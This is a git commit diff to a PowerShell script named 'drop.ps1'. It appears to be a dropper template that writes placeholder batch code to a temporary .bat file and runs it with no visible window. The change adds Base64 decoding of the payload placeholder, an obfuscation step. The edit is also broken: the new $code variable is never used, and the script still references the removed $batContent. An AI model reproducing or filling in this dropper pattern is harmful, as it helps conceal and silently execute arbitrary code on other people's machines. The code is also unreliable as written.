4fd4d00cbbd0b45bf32849c28cbcbadacf66086e
43a1723 <hai1723notgay@gmail.com>
2024-06-30 19:50:27 +0700

    Update drop.ps1

--- file/drop/drop.ps1
+++ file/drop/drop.ps1
@@ -1,6 +1,4 @@
-$batContent = @("
-batcodeinhere
-")
+$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("batcodeinhere"))
 $tempBatFile = [System.IO.Path]::GetTempFileName() + ".bat"
 Set-Content -Path $tempBatFile -Value $batContent
 Start-Process -FilePath $tempBatFile -NoNewWindow -Wait
